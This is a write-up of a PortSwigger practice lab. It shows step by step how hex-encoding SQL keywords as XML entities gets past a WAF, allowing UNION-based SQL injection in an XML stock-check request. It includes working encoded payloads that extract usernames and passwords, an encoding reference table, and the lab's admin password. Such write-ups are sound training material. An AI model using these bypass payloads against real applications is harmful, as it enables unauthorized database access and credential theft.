# SQL Injection with Filter Bypass via XML Encoding

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Perform a SQL injection attack through the stock check feature to retrieve the admin user's credentials and log in.

---

## Lab

https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

---

## OWASP Category

A03:2021 – Injection

---

## Core Concept

This lab has a **WAF (Web Application Firewall)** that blocks common SQL injection keywords like `SELECT`, `UNION`, `FROM` in the request body.

The injection point is inside an **XML body** in a stock check request. XML supports **HTML entity encoding** — we use this to encode SQL keywords so the WAF doesn't recognize them, but the SQL interpreter still processes them correctly after server-side XML decoding.

```xml
<!-- WAF sees this and allows it through -->
&#x53;ELECT  →  decoded to  →  SELECT

<!-- SQL interpreter sees the decoded version and executes it -->
```

Common XML entity encodings for SQL keywords:

| Character | XML Entity |
|-----------|-----------|
| S | `&#x53;` |
| U | `&#x55;` |
| E | `&#x45;` |
| L | `&#x4c;` |
| C | `&#x43;` |
| T | `&#x54;` |

---

## Steps to Solve

---

**Step 1 — Find the Injection Point**

Navigate to any product page and click **Check stock**. Intercept this request in ZAP or Burp:

```xml
POST /product/stock HTTP/1.1
Host: lab-id.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

The `storeId` parameter is our injection point.

<img width="975" height="353" alt="image" src="https://github.com/user-attachments/assets/124dc5e7-430d-4347-82aa-b38afd465e34" />

---

**Step 2 — Confirm WAF is Blocking**

Try a normal UNION payload in `storeId`:

```xml
<storeId>1 UNION SELECT NULL--</storeId>
```

Response: **Attack detected** or **400 Bad Request** — WAF is blocking SQL keywords.

<img width="422" height="214" alt="image" src="https://github.com/user-attachments/assets/b2a4fd01-296a-4027-a0d1-189ba7323738" />

---

**Step 3 — Bypass WAF with XML Encoding**

Encode the SQL keywords using XML hex entities. The word `SELECT` becomes:

```
&#x31;&#x20;&#x55;&#x4E;&#x49;&#x4F;&#x4E;&#x20;&#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;&#x20;&#x4E;&#x55;&#x4C;&#x4C;&#x2D;&#x2D;
```

Full encoded **UNION SELECT NULL--** payload in storeId:

```xml
<storeId>
    &#x31;&#x20;&#x55;&#x4E;&#x49;&#x4F;&#x4E;&#x20;&#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;&#x20;&#x4E;&#x55;&#x4C;&#x4C;&#x2D;&#x2D;
</storeId>
```

This bypasses the WAF because the WAF sees encoded characters, not SQL keywords. The XML parser decodes them before passing to the SQL interpreter.

<img width="409" height="121" alt="image" src="https://github.com/user-attachments/assets/6875c147-61f0-4020-bdc0-aa2a2baf8b2d" />

---

**Step 4 — Find Number of Columns**

Test column count with encoded UNION SELECT NULL--:

```xml
<storeId>&#x31;&#x20;&#x55;&#x4E;&#x49;&#x4F;&#x4E;&#x20;&#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;&#x20;&#x4E;&#x55;&#x4C;&#x4C;&#x2D;&#x2D;</storeId>
```

```xml
<storeId>&#x31;&#x20;&#x55;&#x4E;&#x49;&#x4F;&#x4E;&#x20;&#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;&#x20;&#x4E;&#x55;&#x4C;&#x4C;&#x2C;&#x4E;&#x55;&#x4C;&#x4C;&#x2D;&#x2D;</storeId>
```

Normal response with 1 NULL = **1 column**.

<img width="384" height="333" alt="image" src="https://github.com/user-attachments/assets/981d5c2f-13f6-4704-afb6-aba3b37db205" />

---

**Step 5 — Extract Username and Password**

Since the database already has a `users` table with `username` and `password` columns (given in lab description), concatenate both in one column:

```xml
<storeId>
    &#x31;&#x20;&#x55;&#x4E;&#x49;&#x4F;&#x4E;&#x20;&#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x7C;&#x7C;&#x27;&#x7E;&#x27;&#x7C;&#x7C;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4F;&#x4D;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x2D;&#x2D;
</storeId>
```

Decoded this becomes:
```sql
1 UNION SELECT username||'~'||password FROM users--
```

The `~` separator helps us split username and password from the output.

<img width="970" height="421" alt="image" src="https://github.com/user-attachments/assets/01088815-5d88-4d78-b120-541c83363809" />

<img width="436" height="394" alt="image" src="https://github.com/user-attachments/assets/46f34165-712c-499a-a673-bc64cea1dc41" />

---

**Step 6 — Log In as Administrator**

From the response read the administrator credentials:

```
administrator~jv082de4ivjguvf1saqf
```

Navigate to login page and enter:

- **Username:** `administrator`
- **Password:** `jv082de4ivjguvf1saqf`

---

**Lab Solved**

<img width="1494" height="663" alt="image" src="https://github.com/user-attachments/assets/de08fbcd-d33f-45db-abca-db208bb3805d" />

---

## Full XML Encoding Reference

| SQL Keyword | XML Encoded |
|-------------|------------|
| `UNION` | `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` |
| `SELECT` | `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;` |
| `FROM` | `&#x46;&#x52;&#x4f;&#x4d;` |
| `WHERE` | `&#x57;&#x48;&#x45;&#x52;&#x45;` |
| `AND` | `&#x41;&#x4e;&#x44;` |

---

## How This Differs from Previous Labs

| | Normal UNION SQLi | XML Encoded SQLi |
|--|--|--|
| Injection point | URL parameter | XML request body |
| WAF present | No | Yes |
| Keywords blocked | No | Yes |
| Bypass method | None needed | XML hex entity encoding |
| SQL executed | Same | Same — after XML decoding |

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
